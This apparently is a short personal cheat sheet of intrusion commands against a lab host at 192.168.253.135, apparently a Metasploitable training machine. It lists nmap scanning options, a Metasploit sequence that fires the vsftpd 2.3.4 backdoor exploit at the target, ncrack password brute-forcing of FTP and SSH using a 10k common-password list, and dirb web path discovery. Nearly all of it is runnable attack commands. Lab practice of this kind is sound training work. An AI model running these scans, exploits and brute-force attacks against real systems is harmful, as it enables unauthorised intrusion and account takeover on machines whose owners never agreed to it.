#### Intrusion Tools ####

### Nmap ###
#Scan a Subnet for common services (255 addresses)
nmap 192.168.253.135/24

#Scan an specific port or port ranges
nmap -p 1-100 192.168.253.135

#Perform Fast Scan
nmap -F 192.168.253.135

#Scan with Standard Service Detection
nmap -sV 192.168.253.135

#Scan with Operating System detection only (Requires root access --> sudo)
nmap -O 192.168.253.135

#Scan all ports (Aggressive Scan)
nmap -A 192.168.253.135


### Metasploit ###
msfconsole #Launches Metasploit Console
use exploit/unix/ftp/vsftpd_234_backdoor # Pick an exploit
set RHOST 192.168.253.135 # Set the target
exploit  # Fire away

#nCrack Example
#Try different username and passwords
ncrack 192.168.253.135:21

#Specify a specific user
ncrack 192.168.253.135:21 --user Luke

#Tail the end of the log file "Live" on Metasploitable machine ;)
tail -f /var/log/vsftpd.log

#Another Example for SSH 
ncrack 192.168.253.135:22 --user msfadmin -P 10k-most-common-passwords.txt -p ssh -v
tail -f /var/log/auth.log


#dirb tool to discover all webpages
dirb http://192.168.253.135